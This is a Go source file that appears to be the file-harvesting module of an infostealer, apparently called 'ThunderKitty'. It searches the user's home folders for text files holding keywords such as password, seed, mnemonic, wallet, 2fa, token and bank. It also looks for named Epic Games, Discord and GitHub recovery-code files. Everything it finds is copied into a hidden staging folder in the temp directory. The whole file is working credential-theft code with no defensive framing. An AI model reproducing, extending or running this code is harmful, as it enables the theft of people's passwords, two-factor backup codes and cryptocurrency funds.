package BackupCodes

import (
	"bufio"
	"io"
	"os"
	"os/user"
	"path/filepath"
	"strings"
)

func Search() {
	usr, _ := user.Current()
	drs := []string{
		filepath.Join(usr.HomeDir, "Downloads"),
		filepath.Join(usr.HomeDir, "Desktop"),
		filepath.Join(usr.HomeDir, "Documents"),
		filepath.Join(usr.HomeDir, "Videos"),
		filepath.Join(usr.HomeDir, "Pictures"),
	}
	dir2c := filepath.Join(os.TempDir(), "ThunderKitty", "SensitiveFiles")
	if err := os.MkdirAll(dir2c, os.ModePerm); err != nil {
		panic(err)
	}
	keywords := []string{
		"secret", "password", "account", "tax", "key", "wallet", "gang", "default", "backup", "passw", "mdp", "motdepasse", "acc", "mot_de_passe", "login", "secret", "bot", "atomic", "account", "acount", "paypal", "banque", "bot", "metamask", "wallet", "crypto", "exodus", "discord", "2fa", "code", "memo", "compte", "token", "backup", "secret", "seed", "mnemonic", "memoric", "private", "key", "passphrase", "pass", "phrase", "steal", "bank", "info", "casino", "prv", "privÃ©", "prive", "telegram", "identifiant", "identifiants", "personnel", "trading", "bitcoin", "sauvegarde", "funds", "recup", "note",
	}
	specfile := []string{
		"Epic Games Account Two-Factor backup codes.txt",
		"discord_backup_codes.txt",
		"github-recovery-codes.txt",
	}
	for _, dir := range drs {
		filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
			if strings.HasPrefix(info.Name(), "MedalLog") || strings.HasPrefix(info.Name(), "MedalLauncherLog") || info.IsDir() || !strings.HasSuffix(info.Name(), ".txt") {
				return nil
			}

			if keywordpattern(path, keywords) || specfilepattern(path, specfile) {
				copyFile(path, filepath.Join(dir2c, info.Name()))
			}
			return nil
		})
	}
}
func keywordpattern(filePath string, keywords []string) bool {
	file, _ := os.Open(filePath)
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		for _, kw := range keywords {
			if strings.Contains(line, kw) {
				return true
			}
		}
	}
	return false
}
func specfilepattern(filePath string, specfile []string) bool {
	for _, sf := range specfile {
		if filepath.Base(filePath) == sf {
			return true
		}
	}
	return false
}
func copyFile(src, dst string) {
	skibidifile, _ := os.Open(src)
	defer skibidifile.Close()
	destskibidi, _ := os.Create(dst)
	defer destskibidi.Close()
	io.Copy(destskibidi, skibidifile)
}
